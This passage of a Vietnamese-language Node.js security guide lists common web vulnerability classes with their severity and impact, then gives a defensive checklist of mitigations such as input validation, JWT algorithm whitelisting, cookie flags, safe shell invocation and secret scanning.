| 05 | Path Traversal | 🔴 CRITICAL | Đọc file nhạy cảm |
| 06 | SSRF | 🟠 HIGH | Internal network exposure |
| 07 | JWT Algorithm None | 🔴 CRITICAL | Forge any user token |
| 08 | Cookie Flags Thiếu | 🟠 HIGH | Session theft, CSRF |
| 09 | CORS Wildcard | 🟠 HIGH | Cross-origin data theft |
| 10 | Command Injection | 🔴 CRITICAL | RCE, server takeover |
| 11 | Eval/Function | 🔴 CRITICAL | RCE |
| 12 | Insecure Deserialize | 🟠 HIGH | RCE, data tampering |
| 13 | Header Injection CRLF | 🟠 HIGH | Cache poisoning, XSS |
| 14 | Open Redirect | 🟡 MEDIUM | Phishing, token theft |
| 15 | Rate Limiting Thiếu | 🟠 HIGH | Brute force, DOS |
| 16 | Secret In Source | 🔴 CRITICAL | Credential exposure |

## Checklist Bảo Mật Nhanh

```
□ Tất cả input từ user đều qua schema validation (zod/joi)
□ MongoDB queries dùng mongo-sanitize hoặc typed inputs
□ EJS templates dùng <%= thay vì <%-  (trừ khi DOMPurify)
□ Deep merge kiểm tra __proto__ / constructor / prototype
□ Regex phức tạp dùng re2 hoặc có timeout
□ File paths dùng path.basename() + startsWith() check
□ HTTP fetch URLs được validate chống SSRF
□ JWT dùng algorithms: ['HS256'] whitelist, secret >= 64 chars
□ Cookies có httpOnly + secure + sameSite
□ CORS chỉ whitelist domain cụ thể, không reflect origin
□ Shell commands dùng execFile/spawn với args array
□ Không dùng eval() hoặc new Function() với user input
□ Deserialize chỉ dùng JSON.parse + schema validation
□ Headers được sanitize loại bỏ \r\n trước khi set
□ Redirects chỉ đến relative URL hoặc whitelist domain
□ Rate limiting trên tất cả auth endpoints
□ Secrets trong .env (không commit), validate khi startup
□ npm audit chạy trong CI/CD pipeline
□ gitleaks/trufflehog scan toàn bộ repo
□ helmet middleware bật cho tất cả security headers
```
